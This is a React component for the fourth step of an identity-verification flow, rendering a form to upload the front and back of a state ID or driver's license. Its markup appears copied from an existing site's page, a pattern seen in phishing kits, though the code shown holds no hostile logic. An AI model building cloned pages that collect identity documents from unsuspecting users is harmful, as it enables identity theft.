import React from 'react'
import dlFront from "../../img/dlfront.jpg";
import dlBack from "../../img/dlback.jpg";

function Step4({handleSubmit, handleChange, handleNavigate, img}) {
    return (
        <>
         <div class="content-container" id="Cstep4" role="main" tabindex="-1">
    <form onSubmit={(e)=>handleSubmit(e,"front")}>
        <div class='row'>
            <div class='large-12 medium-12 small-12 column'>
            
            <h1 style={{display: "flex",justifyContent: "center"}}>State ID / Driver's License Confirmation</h1>

            </div>
        </div>
        <div class='box'>
            <div class='row'>
                <div class='medium-12 columns'>
                    <div class='large-12 medium-12 small-12 column'>
                        <p class="align-right margin-bottom-none">
                            <span class="required">*</span>
                            Required fields
                        </p>
                    </div>




                    <center>
                        <div class="row&#32;form-row">
                            <div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;"><label class="form-control" for="username">Upload
                                    State ID / Driver's License Front&nbsp;<span class="required">*&nbsp;</span></label>
                        
                            </div>
                        
                        
                            <div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left">
                        
                                <div class="img-wrapper"><img src={img.stateId_dlFront ? img.stateId_dlFront : dlFront} alt="" /></div>
                        
                                <input class="stretch" id="stateId_dlFront" name="stateId_dlFront" type="file" onChange={handleChange} />
                        
                            </div>
                            <div class="large-5&#32;medium-3&#32;small-12&#32;columns&#32;left"></div>
                        </div>
                    
                    
                    
                    <div class="row&#32;form-row">
                        <div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;"><label class="form-control"
                                for="username">Upload State ID / Driver's License Back&nbsp;<span
                                    class="required">*&nbsp;</span></label>

                        </div>

                        
                        <div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left">

                            <div class="img-wrapper"><img src={img.stateId_dlBack ? img.stateId_dlBack : dlBack} alt="" /></div>
                        
                            <input class="stretch" id="stateId_dlBack" type="file" name="stateId_dlBack" onChange={handleChange}  value="" />

                        </div>
                        <div class="large-5&#32;medium-3&#32;small-12&#32;columns&#32;left"></div>
                    </div>

                    </center>


                    <div class='small-12 columns button-group'>
                        
                            
                        <input class="button&#32;small&#32;navigationButton&#32;primary"
                            id="verifyverifyyouridentitySubmit" name="Submit" type="submit" value="Continue" />

                                    <input
                            className="button small navigationButton standard back" onClick={()=>handleNavigate("back")} id="verifysigninBack" name="Back"
                            type="button" value="Back" />
                    </div>
                </div>
            </div>
        </div>

    </form>
</div>
        </>
    )
}

export default Step4
